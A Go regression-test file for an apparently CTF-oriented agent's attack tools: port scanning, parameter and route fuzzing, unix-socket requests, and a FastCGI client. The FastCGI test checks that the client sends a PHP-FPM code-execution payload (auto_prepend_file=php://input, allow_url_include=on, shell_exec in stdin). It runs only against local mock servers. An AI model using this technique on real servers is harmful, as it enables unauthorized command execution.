package kernel

// infra_test.go —— 新工具的回归测试。
//
// 每个测试锁住一个「能力」，改坏了就应该在这里红：
//   1. ports    —— 能发现非标准端口上的服务
//   2. paramfuzz —— 能从固定错误串里找出被真正消费的参数名
//   3. fcgi     —— FastCGI 六字段记录头与三个关键 PHP 参数都发对
//   4. unix     —— 能在 unix socket 上完成一次 HTTP 往返

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strconv"
	"strings"
	"testing"
)

func TestPortsFindsNonStandardListener(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Skipf("无法监听: %v", err)
	}
	defer ln.Close()
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			_, _ = c.Write([]byte("HTTP/1.1 200 OK\r\nServer: probe\r\n\r\n"))
			c.Close()
		}
	}()
	ts, _, _ := newTestToolSet(t)
	port := ln.Addr().(*net.TCPAddr).Port
	out := call(t, ts, "ports", fmt.Sprintf(`{"host":"127.0.0.1","ports":"%d","timeout_ms":400}`, port))
	if !strings.Contains(out, strconv.Itoa(port)) {
		t.Fatalf("没有扫到刚监听的端口 %d:\n%s", port, out)
	}
}

func TestParamFuzzFindsRenamedParam(t *testing.T) {
	// 模拟「前端参数名与服务端不一致」：服务端只认一个合成出来的名字，其余一律返回固定错误串
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var body map[string]any
		_ = json.NewDecoder(r.Body).Decode(&body)
		if _, ok := body["partner_url"]; ok {
			fmt.Fprint(w, `{"ok":true,"data":{"status":"synced"}}`)
			return
		}
		w.WriteHeader(400)
		fmt.Fprint(w, `{"error":"target is required"}`)
	}))
	defer srv.Close()

	ts, _, _ := newTestToolSet(t)
	out := call(t, ts, "paramfuzz", fmt.Sprintf(
		`{"url":%q,"baseline":"target is required","words":["url","target","endpoint","target_url","partner_url","host"],"threads":4}`,
		srv.URL))
	if !strings.Contains(out, "partner_url") {
		t.Fatalf("没找到真实参数名 partner_url:\n%s", out)
	}
	if strings.Contains(out, "\nurl ") {
		t.Fatalf("把不存在的 url 也报成命中了:\n%s", out)
	}
}

func TestParamFuzzBigWordlistLoaded(t *testing.T) {
	words := loadEmbeddedWordlist("params")
	if len(words) < 2000 {
		t.Fatalf("内置参数字典太小：%d", len(words))
	}
	has := map[string]bool{}
	for _, w := range words {
		has[w] = true
	}
	for _, must := range []string{"url", "filename", "cmd", "callback"} {
		if !has[must] {
			t.Fatalf("内置字典缺少 %q", must)
		}
	}
	// 复合命名规则（<名词>_<类别>）必须能覆盖常见形态
	comps := expandCompoundParams()
	if len(comps) < 500 {
		t.Fatalf("复合参数名生成太少：%d", len(comps))
	}
	seenComp := map[string]bool{}
	for _, c := range comps {
		seenComp[c] = true
	}
	for _, must := range []string{"target_url", "callback_url", "file_path", "webhook_url", "upload_url"} {
		if !seenComp[must] {
			t.Fatalf("复合命名规则没有生成 %q", must)
		}
	}
}

// 真实 FastCGI 服务端：用一个最小实现回放请求，验证客户端把 PHP_VALUE /
// auto_prepend_file / stdin 都发对了。
func TestFCGISendsExpectedParams(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Skipf("无法监听: %v", err)
	}
	defer ln.Close()
	got := make(chan map[string]string, 1)
	go func() {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		defer c.Close()
		params := map[string]string{}
		buf := make([]byte, 65536)
		var stdin []byte
		var pending []byte
		// 关键：记录「收到过 STDIN 记录」这个事实，而不是「STDIN 有没有内容」。
		// 客户端用一条内容为空的 STDIN 记录表示输入结束；只看 len(stdin) 会漏掉这种情况，
		// 服务端就会一直等下去，测试表现为 20s 超时（随机复现，取决于 TCP 分片）。
		sawStdin := false
		for !sawStdin {
			n, err := c.Read(buf)
			if err != nil {
				break
			}
			// 分片可能把一条记录切成两半，必须把尾部留给下一轮，不能丢。
			pending = append(pending, buf[:n]...)
			for len(pending) >= 8 {
				rtype := pending[1]
				clen := int(pending[4])<<8 | int(pending[5])
				plen := int(pending[6])
				if 8+clen+plen > len(pending) {
					break
				}
				content := pending[8 : 8+clen]
				pending = pending[8+clen+plen:]
				switch rtype {
				case fcgiParams:
					parseFCGIParams(content, params)
				case fcgiStdin:
					stdin = append(stdin, content...)
					sawStdin = true
				}
			}
		}
		params["__stdin__"] = string(stdin)
		got <- params
		resp := append([]byte("Content-type: text/plain\r\n\r\nPWN-OK"), 0)
		_ = fcgiWrite(c, fcgiStdout, resp, 1)
		_ = fcgiWrite(c, fcgiEndRequest, []byte{0, 0, 0, 0, 0, 0, 0, 0}, 1)
	}()

	ts, _, _ := newTestToolSet(t)
	port := ln.Addr().(*net.TCPAddr).Port
	out := call(t, ts, "fcgi", fmt.Sprintf(
		`{"host":"127.0.0.1","port":%d,"script":"/var/www/html/index.php","command":"id"}`, port))
	if !strings.Contains(out, "PWN-OK") {
		t.Fatalf("没有拿到 FastCGI 响应体:\n%s", out)
	}
	select {
	case p := <-got:
		if p["SCRIPT_FILENAME"] != "/var/www/html/index.php" {
			t.Fatalf("SCRIPT_FILENAME 不对: %q", p["SCRIPT_FILENAME"])
		}
		if !strings.Contains(p["PHP_VALUE"], "auto_prepend_file=php://input") {
			t.Fatalf("PHP_VALUE 不对: %q", p["PHP_VALUE"])
		}
		if !strings.Contains(strings.ToLower(p["PHP_ADMIN_VALUE"]), "allow_url_include=on") {
			t.Fatalf("PHP_ADMIN_VALUE 不对: %q", p["PHP_ADMIN_VALUE"])
		}
		if !strings.Contains(p["__stdin__"], "shell_exec") {
			t.Fatalf("stdin 里没有 PHP 代码: %q", p["__stdin__"])
		}
	default:
		t.Fatal("服务端没有收到请求")
	}
}

func parseFCGIParams(b []byte, out map[string]string) {
	readLen := func() (int, int) {
		if len(b) == 0 {
			return 0, 0
		}
		if b[0] < 128 {
			return int(b[0]), 1
		}
		if len(b) < 4 {
			return 0, 0
		}
		v := int(b[0]&0x7f)<<24 | int(b[1])<<16 | int(b[2])<<8 | int(b[3])
		return v, 4
	}
	for len(b) > 0 {
		nl, adv := readLen()
		if adv == 0 {
			return
		}
		b = b[adv:]
		vl, adv2 := readLen()
		if adv2 == 0 {
			return
		}
		b = b[adv2:]
		if nl+vl > len(b) {
			return
		}
		out[string(b[:nl])] = string(b[nl : nl+vl])
		b = b[nl+vl:]
	}
}

func TestUnixHTTPOverSocket(t *testing.T) {
	dir := t.TempDir()
	sock := dir + "/meta.sock"
	ln, err := net.Listen("unix", sock)
	if err != nil {
		t.Skipf("无法建 unix socket: %v", err)
	}
	defer ln.Close()
	go func() {
		srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/latest/flag" {
				fmt.Fprint(w, "flag{from-metadata-agent}")
				return
			}
			http.NotFound(w, r)
		})}
		_ = srv.Serve(ln)
	}()
	ts, _, _ := newTestToolSet(t)
	out := call(t, ts, "unix", fmt.Sprintf(`{"socket":%q,"path":"/latest/flag"}`, sock))
	if !strings.Contains(out, "flag{from-metadata-agent}") {
		t.Fatalf("unix socket 请求失败:\n%s", out)
	}
}

// 真机联调：只有设置了 CTFAGENT_LIVE_HOST 才跑（CI 里默认跳过）
func TestLivePortsScan(t *testing.T) {
	host := os.Getenv("CTFAGENT_LIVE_HOST")
	if host == "" {
		t.Skip("未设置 CTFAGENT_LIVE_HOST，跳过真机联调")
	}
	ts, _, _ := newTestToolSet(t)
	out := call(t, ts, "ports", fmt.Sprintf(`{"host":%q,"ports":"80,9000","timeout_ms":2000}`, host))
	t.Log(out)
}

// After login, both route fuzzing and parameter-name fuzzing must reuse the same
// cookie jar as the ordinary http tool. Otherwise an authenticated endpoint can
// look uniformly unauthorized and a valid input is silently missed.
func TestFuzzToolsReuseHTTPLoginSession(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/login" {
			http.SetCookie(w, &http.Cookie{Name: "sid", Value: "ok", Path: "/"})
			fmt.Fprint(w, "logged in")
			return
		}
		if c, err := r.Cookie("sid"); err != nil || c.Value != "ok" {
			http.Error(w, "auth required", http.StatusUnauthorized)
			return
		}
		if r.URL.Query().Get("secret") == "ok" {
			fmt.Fprint(w, "accepted")
			return
		}
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "missing")
	}))
	defer srv.Close()

	ts, _, _ := newTestToolSet(t)
	login := call(t, ts, "http", fmt.Sprintf(`{"url":%q}`, srv.URL+"/login"))
	if !strings.Contains(login, "sid=ok") {
		t.Fatalf("login cookie was not stored: %s", login)
	}

	routeOut := call(t, ts, "fuzz", fmt.Sprintf(
		`{"url":%q,"words":["wrong","secret"],"method":"GET","diff":true,"preview":true}`,
		srv.URL+"/api?FUZZ=ok"))
	if !strings.Contains(routeOut, "secret") || !strings.Contains(routeOut, "200") {
		t.Fatalf("fuzz did not reuse authenticated session:\n%s", routeOut)
	}

	paramOut := call(t, ts, "paramfuzz", fmt.Sprintf(
		`{"url":%q,"method":"GET","location":"query","baseline":"missing","value":"ok","words":["wrong","secret"],"threads":2}`,
		srv.URL+"/api"))
	if !strings.Contains(paramOut, "secret") || !strings.Contains(paramOut, "200") {
		t.Fatalf("paramfuzz did not reuse authenticated session:\n%s", paramOut)
	}
}
